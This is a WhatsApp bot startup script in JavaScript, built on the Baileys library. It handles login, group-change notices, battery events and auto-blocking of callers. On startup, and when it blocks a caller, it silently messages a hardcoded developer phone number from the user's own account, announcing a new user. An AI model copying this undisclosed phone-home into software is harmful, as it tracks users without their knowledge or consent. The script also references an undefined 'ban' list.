/// GOSAH SOK RECODE NJIM

// BY WANN AR





const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')

const simple = require('./lib/simple.js')

const WAConnection = simple.WAConnection(_WAConnection)

const wann = new WAConnection()

const qrcode = require("qrcode-terminal")

const moment = require("moment-timezone")

const fs = require("fs")

const util = require('util')

const figlet = require('figlet')

const term = require('terminal-kit').terminal

const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")

const fetch = require('node-fetch')

const { color, bgcolor, WannLog } = require('./lib/color')

const { exec } = require('child_process')

const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, info, close } = require('./lib/yntkts')

const { banner, start, success }  = require('./lib/functionss')

const { waiting } = require('./lib/waiting')

const settings = JSON.parse(fs.readFileSync('./settings.json'))
const welcome = require('./message/group')
baterai = 'unknown'

NamaOwner = '©Wann'

NamaBot = 'Invibotz'

NomorOwner = '6285640068416'

target = "6285640068416@s.whatsapp.net"

spc1 = '         '



spc2 = '\n                           '



spc3 = '                   '



spc4 = '               '







charging = 'unknown'

const sleep = async (ms) => {

return new Promise(resolve => setTimeout(resolve, ms))

}

require('./invibot.js')

nocache('./invibot.js', module => console.log(`${module} is now updated!`))

//button nya



const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 10,status: 200, thumbnail: fs.readFileSync(`./media/image/me.jpg`), surface: 200, message: `)-----[XM BOT]-----(`, orderTitle: 'wann.ratama', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}

       

const starts = async (wann = new WAConnection()) => {

   console.log(color('Selamat Datang Di Invibot Menu\n - WANN OFC : DEVELOPER ', 'red'), color('\nScript Ini Gratis Buat Kalian\n\n THANKS TO \n - ZEEONE OFC \n - FARDAN OFC', 'green'))

wann.logger.level = 'warn'

    wann.version = [2, 2147, 14]

console.log(color(figlet.textSync('XMBOT', {



		font: 'Pagga',



		horizontalLayout: 'default',



		vertivalLayout: 'default',



		width: 80,



		whitespaceBreak: false



	}), 'cyan'))



    wann.browserDescription = ['Wann Bot Hack', 'SAFARI', '8.1']



    wann.on('qr', () => {

        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan bang'))

    })

    fs.existsSync('./session.json') && wann.loadAuthInfo('./session.json')

    wann.on('connecting', () => {

        start('2', 'Connecting...')

    })

    wann.sendMessage(`${target}`, "\`\`\`[ ! ] PENGGUNA BARU DETECT [ ! ]\`\`\`\n\n\`\`\`Hai Kak Salam Pengguna Invibot V2.1 \`\`\`", MessageType.text)

    wann.on('open', () => {

        success('2', 'Connected')

        setTimeout( () => { 	

	    	}, 1000)    		    	     	

    })

      await wann.connect({timeoutMs: 30*1000})

        fs.writeFileSync('./session.json', JSON.stringify(wann.base64EncodedAuthInfo(), null, '\t'))

        buttonss = [

{buttonId: `#menu`, buttonText:{displayText: '💾MENU'}, type: 1},

{buttonId: `#owner`, buttonText:{displayText: '👤OWNER'}, type: 1}

]



buttonMessagee = {

contentText: `Halo kak Izin pake botnya ya 😊`,

footerText: `©Created by Wann` ,

buttons: buttonss,

headerType: 1

}

wann.sendMessage(`6285640068416@s.whatsapp.net`,  buttonMessagee, MessageType.buttonsMessage,{

        caption: '[ • WANN AR • ]',

        "contextInfo": {

            text: 'hi',

            "forwardingScore": 1000000000,

            isForwarded: true,

            sendEphemeral: true,

         

            },

			quoted: ftroli,sendEphemeral: true 

			})

        

    wann.on('ws-close', () => {

        console.log(WannLog('Koneksi terputus, mencoba menghubungkan kembali..'))

    })



    // Mengkoneksi ulang

    wann.on('close', async ({ reason, isReconnecting }) => {

        console.log(WannLog('Terputus, Alasan :' + reason + '\nMencoba mengkoneksi ulang :' + isReconnecting))

        if (!isReconnecting) {

            console.log(WannLog('Connect To Phone Rejected and Shutting Down.'))

        }

    })



	// Baterai



	wann.on('CB:action,,battery', json => {



		global.batteryLevelStr = json[2][0][1].value



		global.batterylevel = parseInt(batteryLevelStr)



		baterai = batterylevel



		if (json[2][0][1].live == 'true') charging = true



		if (json[2][0][1].live == 'false') charging = false



		console.log(json[2][0][1])



		console.log('Baterai : ' + batterylevel + '%')



	})



	global.batrei = global.batrei ? global.batrei : []



	wann.on('CB:action,,battery', json => {



		const batteryLevelStr = json[2][0][1].value



		const batterylevel = parseInt(batteryLevelStr)



		global.batrei.push(batterylevel)



	})  



    wann.on('chat-update', async (message) => {

        require('./invibot.js')(wann, message)

        ownerNumber = ["6285640068416@s.whatsapp.net","6285640068416@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]

        dtod = "6285640068416@s.whatsapp.net"

       otod = `${settings.NomorOwner}@s.whatsapp.net`

       })


      waiting('2', 'Menunggu pesan baru...')
           
        wann.on('group-participants-update', async (anu) => {

            await welcome(wann, anu)
    
  })


	wann.on('group-update', async (anu) => {

		const metdata = await wann.groupMetadata(anu.jid)

    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;wann.;;\nFN:wann.nitem1.TEL;waid=6287708357324:6287708357324\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}

    if(anu.announce == 'false'){

    teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`

    wann.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})

    console.log(color('|INFO|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))

  }

  else if(anu.announce == 'true'){

    teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`

    wann.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})

    console.log(color('|INFO|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))

  }

  else if(!anu.desc == ''){

    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'

    teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`

    wann.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})

    console.log(color('|INFO|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))

  }

  else if(anu.restrict == 'false'){

    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`

    wann.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})

    console.log(color('|INFO|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))

  }

  else if(anu.restrict == 'true'){

    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`

    wann.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})

    console.log(color('|INFO|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))

  }

})



wann.on('CB:action,,call', async json => {

        const callerId = json[2][0][1].from;

        var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'

        wann.sendMessage(`${target}`, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)

        await sleep(5000)

        await wann.blockUser(callerId, "add")

        ban.push(`${callerId}`)

        fs.writeFileSync('./database/banned.json', JSON.stringify(ban))

        })

}



console.clear()

var progressBar , progress = 0 ;

function doProgress()

{

	progress += Math.random() / 10 ;

	progressBar.update( progress ) ;

	

	if ( progress >= 1 )

	{

		setTimeout( function() { console.clear(),

		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {

			console.log(stdout), console.log(bgcolor('https://github.com/X-Invibotz', 'cyan'))})}, 200 ) ;

	}

	else

	{

		setTimeout( doProgress , 100 + Math.random() * 400 ) ;

	}

}





function nocache(module, cb = () => { }) {

    fs.watchFile(require.resolve(module), async () => {

        await uncache(require.resolve(module))

        cb(module)

    })

}



function uncache(module = '.') {

    return new Promise((resolve, reject) => {

        try {

            delete require.cache[require.resolve(module)]

            resolve()

        } catch (e) {

            reject(e)

        }

    })

}

starts()
